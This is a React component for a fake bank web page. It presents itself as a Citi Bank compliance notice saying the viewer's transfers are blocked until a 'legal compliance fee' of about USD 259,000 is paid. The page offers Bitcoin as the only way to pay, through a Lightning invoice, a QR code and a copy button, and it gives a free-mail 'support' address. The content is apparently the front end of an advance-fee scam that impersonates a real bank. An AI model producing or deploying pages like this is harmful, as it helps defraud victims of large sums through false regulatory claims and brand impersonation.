import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import BottomNav2 from "./bottomnav2";
import qr from "../assets/qe.jpg";

const PaymentOptions: React.FC = () => {
  const [method, setMethod] = useState("");
  const [copied, setCopied] = useState(false);
  const navigate = useNavigate();

  const address =
    "lnbc1p50h7nkpp5jw0ucgcrygfh7cspl6mgtmj440k02yhajef8uwugj79uwsjqpqzscqzyssp52dnljxwtmtqake7t8vvhh8wgzzslkputqn2f4vaxcffv6wdarepq9q7sqqqqqqqqqqqqqqqqqqqsqqqqqysgqdqqmqz9gxqyjw5qrzjqwryaup9lh50kkranzgcdnn2fgvx390wgj5jd07rwr3vxeje0glcllu2h2pvrkzhmsqqqqlgqqqqqeqqjqshl6lsrmryqrpgkef9luytu7f32w9tdfqhffca7t9dax87jvsjp4lkchz4neac9r2z4nda8ex8mtxpqqarsxx09lect0l25kwgv9u7sp2gxsww";

  const handleCopy = () => {
    navigator.clipboard.writeText(address).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  return (
    <>
      <div className="max-w-2xl mx-auto p-6 bg-white shadow-lg rounded-xl border border-red-300 text-left text-sm">
        <h2 className="text-red-800 font-bold text-lg mb-2">
          🚫 Transfer Access Restricted – Action Required
        </h2>

        <p className="text-gray-700 mb-4">
          Outbound transfers from this account are currently unavailable.
        </p>

        <p className="text-gray-700 mb-4">
          In accordance with <strong>Citi Bank Compliance Policy</strong> and
          applicable financial regulations, your account requires clearance
          before transfers can be enabled.
        </p>

        <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
          <p className="font-semibold text-red-800 mb-1">
            Mandatory Action Required:
          </p>
          <p>
            A <strong>legal compliance fee</strong> of{" "}
            <span className="font-semibold text-red-700">MXN 4,713,800</span>{" "}
            (approximately{" "}
            <span className="font-semibold text-red-700">USD 259,000</span>) must
            be reviewed by support to enable transfer functionality.
          </p>
          <p className="mt-2">
            This requirement is part of the standard compliance and account
            authorization process.
          </p>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
          <p className="font-semibold text-gray-800 mb-1">
            📄 Compliance Status Summary:
          </p>
          <ul className="list-disc list-inside text-gray-700 space-y-1">
            <li>
              Transfer Status:{" "}
              <span className="text-red-600 font-semibold">Disabled</span>
            </li>
            <li>
              Compliance Tier: <strong>Manual Review Required</strong>
            </li>
            <li>
              Reserve Status:{" "}
              <span className="text-yellow-700 font-semibold">
                Pending Support Confirmation
              </span>
            </li>
            <li>
              Reference Code:{" "}
              <code className="text-gray-800 bg-gray-100 px-1 rounded">
                CTB-LF-471
              </code>
            </li>
          </ul>
        </div>

        <p className="text-gray-700 mb-4">
          To proceed, please contact our support team for guidance and next
          steps. Transfers will remain unavailable until reviewed.
        </p>

        <div className="flex gap-4">
          <a
            href="mailto:unitedservices.AA@accountant.com"
            className="inline-block px-5 py-2 bg-red-800 text-white font-semibold rounded-lg hover:bg-red-700 transition"
          >
            Contact Support
          </a>
        </div>
      </div>

      <div className="bg-gray-100 mb-[100px] p-6 flex justify-center items-center">
        <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
          <h1 className="text-xl font-bold text-center text-red-800 mb-4">
            Pay Now
          </h1>

          <select
            value={method}
            onChange={(e) => setMethod(e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-md mb-4"
          >
            <option value="">-- Choose Payment Method --</option>
            <option value="bitcoin">Bitcoin</option>
          </select>

          {method === "bitcoin" && (
            <div className="bg-yellow-50 p-4 rounded-md flex flex-col gap-4 border border-yellow-300 text-sm">
              <p>Send your Bitcoin payment to the wallet address below:</p>
              <div className="flex justify-center">
                <img
                  src={qr}
                  alt="Bitcoin QR Code"
                  className="w-[200px]"
                />
              </div>

              <div className="flex items-center space-x-2">
                <input
                  type="text"
                  readOnly
                  value={address}
                  className="font-mono text-red-700 bg-gray-100 border border-gray-300 rounded px-3 py-1 w-full"
                />
                <button
                  onClick={handleCopy}
                  className="bg-red-800 text-white px-3 py-1 rounded hover:bg-red-700 transition"
                >
                  {copied ? "Copied!" : "Copy"}
                </button>
              </div>
            </div>
          )}

          <button
            onClick={() => navigate("/dashboard")}
            className="w-full mt-6 px-5 py-2 bg-gray-200 text-gray-700 font-semibold rounded-lg hover:bg-gray-300 transition"
          >
            Close Window
          </button>
        </div>
      </div>

      <BottomNav2 />
    </>
  );
};

export default PaymentOptions;
